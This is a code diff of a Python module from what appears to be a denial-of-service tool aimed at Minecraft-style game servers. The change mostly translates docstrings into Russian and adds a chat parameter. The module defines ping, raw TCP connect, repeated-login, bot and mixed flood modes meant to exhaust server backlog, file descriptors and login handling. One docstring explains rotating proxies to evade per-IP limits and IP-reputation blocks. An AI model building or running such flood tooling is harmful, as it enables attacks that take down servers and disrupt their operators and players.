@@ -1,15 +1,16 @@
-"""DDoS load modes: ping / tcp / login / bot / mixed.
+"""
+Режимы нагрузки DDoS: ping / tcp / login / bot / mixed.
 
-All modes are async. `ping` and `tcp` need no auth and are cheap.
-`login` repeatedly does a full handshake+login (expensive for server).
-`bot` keeps connections alive + chats. `mixed` blends them.
+Все режимы асинхронные. `ping` и `tcp` не требуют авторизации и дёшевы.
+`login` постоянно делает полное handshake+login (дорого для сервера).
+`bot` держит соединения живыми и пишет в чат. `mixed` смешивает их.
 """
 import asyncio
 import random
 import socket
 import time
 
-from .mcconn import MCConn, MCConnError
+from .mcconn import MCConn
 from .bots import BotPool
 from . import bypass
 
@@ -40,7 +41,7 @@ class Stats:
 
 async def ping_ddos(host, port, version, iterations=None, workers=20,
                     stop=None, stats=None, log=None):
-    """Status ping flood. Cheap, hits the proxy/status pipeline."""
+    """Флуд status-пингом. Дёшево, бьёт по конвейеру прокси/status."""
     stats = stats or Stats()
     stop = stop or (lambda: False)
     log = log or (lambda *a: None)
@@ -65,7 +66,7 @@ async def ping_ddos(host, port, version, iterations=None, workers=20,
 
 async def tcp_ddos(host, port, iterations=None, workers=20,
                    stop=None, stats=None, log=None):
-    """Raw TCP connect flood. Hits backlog / fd exhaustion."""
+    """Флуд сырыми TCP-соединениями. Бьёт по backlog и исчерпанию файловых дескрипторов."""
     stats = stats or Stats()
     stop = stop or (lambda: False)
     log = log or (lambda *a: None)
@@ -91,11 +92,13 @@ async def tcp_ddos(host, port, iterations=None, workers=20,
 async def login_ddos(host, port, version, workers=20,
                      stop=None, stats=None, log=None,
                      signed=False, share_key=True, proxies=None):
-    """Repeated full logins. Expensive: runs full login handshake each time.
+    """
+Повторные полные логины. Дорого: каждый раз полное login-рукопожатие.
 
-    proxies: optional list of proxy dicts; each worker picks a random one
-    (rotates on failure) so different egress IPs are used — needed to beat
-    per-IP connection limits and DC-IP reputation blocks."""
+proxies: необязательный список dict'ов прокси; каждый воркер берёт случайный
+(и меняет его при ошибке), чтобы использовать разные исходящие IP — это нужно
+против лимита соединений на IP и блокировок по репутации IP.
+    """
     stats = stats or Stats()
     stop = stop or (lambda: False)
     log = log or (lambda *a: None)
@@ -141,7 +144,7 @@ async def login_ddos(host, port, version, workers=20,
 def bot_load(host, port, version, count=20, proxy=None, online=False,
              chat_every=8.0, log=None, signed=False, share_key=True,
              offline_uuid=None):
-    """Returns a running BotPool (keeps connections + chats)."""
+    """Возвращает уже запущенный BotPool (держит соединения + чаты)."""
     pool = BotPool(host, port, version, count=count, proxy=proxy,
                    online=online, log=log, chat_every=chat_every,
                    signed=signed, share_key=share_key,
@@ -153,12 +156,13 @@ def bot_load(host, port, version, count=20, proxy=None, online=False,
 
 async def mixed_ddos(host, port, version, workers=30, bot_count=10,
                      stop=None, stats=None, log=None,
-                     signed=False, share_key=True):
-    """Blend of ping + tcp + login + a small bot pool."""
+                     signed=False, share_key=True, chat_every=8.0):
+    """Смесь: ping + tcp + login + маленький пул ботов."""
     stats = stats or Stats()
     stop = stop or (lambda: False)
     log = log or (lambda *a: None)
     pool = bot_load(host, port, version, count=bot_count, log=log,
+                    chat_every=chat_every,
                     signed=signed, share_key=share_key)
 
     modes = ["ping", "ping", "tcp", "login"]
